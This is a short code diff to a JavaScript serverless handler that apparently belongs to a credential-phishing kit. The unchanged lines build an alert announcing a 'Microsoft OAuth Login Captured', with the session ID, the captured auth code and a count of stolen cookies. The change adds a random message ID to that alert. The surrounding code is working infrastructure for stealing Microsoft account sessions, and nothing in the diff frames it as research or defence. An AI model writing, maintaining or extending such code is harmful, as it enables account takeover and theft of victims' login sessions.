@@ -69,6 +69,7 @@ export const handler = async (event, context) => {
     const cookieCount = Array.isArray(cookies) ? cookies.length : 0;
     
     // Build ONLY the essential message - NO TOKEN STATUS ALLOWED
+    const uniqueId = Math.random().toString(36).substring(2, 8);
     const simpleMessage = [
       '🔐 Microsoft OAuth Login Captured!',
       '',
@@ -76,6 +77,7 @@ export const handler = async (event, context) => {
       `🔑 Session ID: ${sessionId}`,
       `✅ Auth Code: ${hasAuthCode ? 'Captured (see file)' : 'Missing'}`,
       `🕒 Time: ${timestamp}`,
+      `🆔 Message ID: ${uniqueId}`,
       '',
       `🍪 Cookies: ${cookieCount > 0 ? `${cookieCount} captured` : 'None captured'}`
     ].join('\n');
